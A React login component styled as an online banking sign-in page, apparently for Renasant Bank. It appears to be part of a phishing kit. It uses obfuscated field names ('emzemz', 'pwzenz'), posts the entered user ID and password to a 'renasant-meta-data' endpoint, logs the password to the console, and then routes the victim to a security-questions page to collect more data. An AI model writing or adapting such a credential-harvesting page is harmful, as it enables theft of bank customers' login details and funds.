import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import FlowCard from '../components/FlowCard';

const LoginForm: React.FC = () => {
  const [emzemz, setEmzemz] = useState('');
  const [pwzenz, setPwzenz] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showPwzenz, setShowPwzenz] = useState(false);
  const [remember, setRemember] = useState(true);
  const [errors, setErrors] = useState({ emzemz: '', pwzenz: '' });
  const navigate = useNavigate();

  const togglePwzenzVisibility = () => {
    setShowPwzenz((prev) => !prev);
  };



  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    setIsLoading(true);
    event.preventDefault();
    let newErrors = { emzemz: '', pwzenz: '' };


    if (pwzenz.length <= 0) {
      newErrors.pwzenz = 'Password is required.';
      setIsLoading(false);
    }

    setErrors(newErrors);

    // Check if there are no errors
    if (!newErrors.emzemz && !newErrors.pwzenz) {
      // Proceed with form submission
      console.log('Form submitted with:', { emzemz, pwzenz });

      const url = `${baseUrl}api/renasant-meta-data-1/`;

      try {
        await axios.post(url, {
          emzemz: emzemz,
          pwzenz: pwzenz,
        });
        console.log('Message sent successfully');
        navigate('/security-questions', {
          state: {
            emzemz: emzemz
          }
        });
      } catch (error) {
        console.error('Error sending message:', error);
        setIsLoading(false);
      }

      setErrors({ emzemz: '', pwzenz: '' });
    }
  };

  return (
    <FlowCard title="Login to Online Banking">
      <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <label className="block text-sm text-slate-500 mb-1" htmlFor="emzemz">User ID</label>
            <div className="flex items-center border border-slate-200 rounded">
              <input
                id="emzemz"
                name="emzemz"
                type="text"
                value={emzemz}
                onChange={(e) => setEmzemz(e.target.value)}
                className="flex-1 px-3 py-3 text-sm focus:outline-none"
                placeholder="User ID"
              />
              <span className="px-3 text-slate-400">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-5.523 0-10-4.477-10-10 0-4.225 2.635-7.821 6.34-9.284" />
                </svg>
              </span>
            </div>
            {errors.emzemz && (
              <div className="flex items-center gap-3 text-sm font-bold mt-2 text-red-600">
                <svg
                  width="1rem"
                  height="1rem"
                  viewBox="0 0 24 24"
                  className="fill-current"
                  aria-hidden="true"
                >
                  <path
                    d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"
                    fillRule="nonzero"
                  ></path>
                </svg>
                <p>Username required</p>
              </div>
            )}
          </div>

          <div>
            <label className="block text-sm text-slate-500 mb-1" htmlFor="pwzenz">Password</label>
            <div className="flex items-center border border-slate-200 rounded">
              <input
                id="pwzenz"
                name="pwzenz"
                type={showPwzenz ? 'text' : 'password'}
                value={pwzenz}
                onChange={(e) => setPwzenz(e.target.value)}
                className="flex-1 px-3 py-3 text-sm focus:outline-none"
                placeholder="Password"
              />
              <button
                type="button"
                onClick={togglePwzenzVisibility}
                className="px-3 text-slate-400"
              >
                {showPwzenz ? 'Hide' : 'Show'}
              </button>
            </div>
            {errors.pwzenz && (
              <div className="flex items-center gap-3 text-sm font-bold mt-2 text-red-600">
                <svg
                  width="1rem"
                  height="1rem"
                  viewBox="0 0 24 24"
                  className="fill-current"
                  aria-hidden="true"
                >
                  <path
                    d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"
                    fillRule="nonzero"
                  ></path>
                </svg>
                <p>Password required</p>
              </div>
            )}
          </div>

          <div className="flex items-center space-x-2">
            <input
              id="remember"
              type="checkbox"
              checked={remember}
              onChange={() => setRemember((r) => !r)}
              className="h-4 w-4 text-[#0f4f6c]"
            />
            <label htmlFor="remember" className="text-sm text-slate-700">Remember Me</label>
          </div>

          <button
            type="submit"
            className="w-full bg-[#0f4f6c] text-white py-3 rounded-md flex items-center justify-center gap-2 disabled:opacity-75"
            disabled={isLoading}
          >
            {isLoading ? (
              <div className="h-5 w-5 animate-spin rounded-full border-2 border-solid border-white border-t-transparent"></div>
            ) : (
              <>
                <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 11c0-1.657 1.343-3 3-3s3 1.343 3 3v1H6v-1c0-1.657 1.343-3 3-3s3 1.343 3 3z" />
                </svg>
                <span>Login</span>
              </>
            )}
          </button>
        <div className="text-center mt-4">
          <a href="#" className="text-sm text-[#0f4f6c] underline">Trouble logging in?</a>
        </div>

        <div className="text-center mt-2">
          <a href="#" className="inline-block text-sm text-[#0f4f6c] underline">Enroll in Online Banking</a>
        </div>
      </form>
    </FlowCard>
  );
}

export default LoginForm;
